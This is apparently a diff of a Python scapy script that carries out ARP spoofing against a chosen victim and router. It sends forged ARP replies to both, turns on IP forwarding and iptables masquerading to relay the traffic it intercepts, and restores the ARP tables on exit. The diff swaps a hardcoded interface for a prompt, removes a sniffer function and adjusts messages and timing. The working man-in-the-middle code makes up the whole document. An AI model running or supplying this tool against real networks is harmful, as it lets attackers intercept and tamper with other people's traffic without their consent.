@@ -4,9 +4,9 @@ from scapy.all import *
 from scapy.layers.l2 import arping
 
 # General variables
-interface = "wlp3s0"
-victimIP = input("victim: \n")
-routerIP = input("router: \n")
+interface = input("Interface: \n")
+victimIP = input("Victim IP: \n")
+routerIP = input("Router IP: \n")
 
 # Turns on or off scapy messages
 scapyVerbose = 0
@@ -34,9 +34,9 @@ def grab_MAC_Addresses():
         victimMAC = grab_MAC(victimIP)
         routerMAC = grab_MAC(routerIP)
 
-        print("\n MAC ADDRESS OBTAINED")
-        print(victimMAC)
-        print(routerMAC, '\n')
+        print("[!] MAC ADDRESS OBTAINED")
+        print("[*] Router mac: \'", routerMAC, '\'')
+        print("[*] Victim mac: \'", victimMAC, '\'')
 
         if victimMAC is not None and routerMAC is not None:
             loop = False
@@ -48,12 +48,10 @@ def grab_MAC_Addresses():
 def spoof(routerIP, victimIP):
     """Used to send out the packets to perform the spoof"""
 
-    print("Router mac: \'", routerMAC, '\'')
-    print("Victim mac: \'", victimMAC, '\'')
-
     # Sends the arp replies
     #   "op = 2" - '2' is the opcode for a reply
 
+    print("[*] Spoofing")
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=scapyVerbose)
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=scapyVerbose)
 
@@ -69,26 +67,16 @@ def restore(routerIP, victimIP):
              hwsrc=routerMAC), count=4, verbose=scapyVerbose)
 
 
-# TODO: Remove when arp works when ARP Spoof works
-def sniffer():
-    pkts = sniff(iface=interface, count=10, prn=lambda
-        x: x.sprintf(" "
-                        "=================================================================\n"
-                        "Source: %IP.src% : %Ether.src%,\n "
-                        "Reciever: %IP.dst% \n "
-                        "=================================================================\n"
-                     ))
-
-
-# TODO: These need proper testing, small errors may be present
 def set_ip_forward(state):
     """Method used to configure the host packet forwarding"""
 
     if state is True:
+
+        # This config has been tested only on Arch linux
         os.system("sysctl net.ipv4.ip_forward=1")
-        os.system("iptables -t nat -A POSTROUTING -o {0} -j MASQUERADE".format(interface))
-        os.system("iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT")
-        os.system("iptables -A FORWARD -i net0 -o {0} -j ACCEPT".format(interface))
+        os.system("iptables -t nat -A POSTROUTING --out-interface {0} -j MASQUERADE".format(interface))
+        os.system("iptables -A FORWARD --match conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT")
+        os.system("iptables -A FORWARD --in-interface {0} --out-interface {0} -j ACCEPT".format(interface))
 
     else:
         os.system("sysctl net.ipv4.ip_forward=0")
@@ -105,10 +93,10 @@ def run():
     while True:
         try:
             spoof(routerIP, victimIP)
-            time.sleep(1)
-            sniffer()
-            
+            time.sleep(5)
+
         except KeyboardInterrupt:
+            print("\n[*] Spoofing stopped!")
             restore(routerIP, victimIP)
             set_ip_forward(False)
             sys.exit(0)
